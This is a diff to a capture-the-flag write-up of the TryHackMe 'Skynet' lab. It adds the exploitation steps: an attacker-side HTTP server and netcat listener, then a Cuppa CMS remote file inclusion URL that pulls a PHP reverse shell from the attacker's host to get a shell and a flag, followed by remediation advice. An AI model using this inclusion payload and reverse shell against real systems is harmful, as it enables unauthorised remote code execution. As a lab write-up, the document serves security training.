@@ -1,6 +1,6 @@
 # Try Hack Me - Skynet
 
-**OWASP Category:** 
+**OWASP Category: A03:2025 – Injection** 
 
 popis
 
@@ -9,6 +9,7 @@ popis
 - **Nmap**
 - **SMBclient**
 - **GoBuster**
+- **NetCat**
 
 ## Methodology:
 
@@ -105,5 +106,23 @@ popis
 
     <img src="\assets\Skynet_php_shell.png" alt="homepage" width="1000px">
 
+    - I set up a HTTP server and a NetCat listener on the attacker machine:
+
+    ```bash
+    python -m http.server
+    nc -nvlp 1234
+    ```
+
+    - Then I have inserted the reverse shell payload into the URL path specified in the exploits description:
+    http://10.114.187.53/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.114.115.176:8000/php-reverse-shell.php
+
+    - We have successfully cached a shell with NetCat:
+
+    <img src="\assets\Skynet_netcat.png" alt="netcat_shell" width="1000px">
+
+    - After navigating in the shell to: /home/milesdyson/user.txt, we found a flag.
 
 ## Remediation
+Do not store passwords in plaintext and do not send them over e-mail. 
+Update Cuppa CMS to the latest supported version and run a regular vulnerability scans.
+Do not pass user-controlled input directly into PHP functions. Have a predefined allow list of trusted files. 
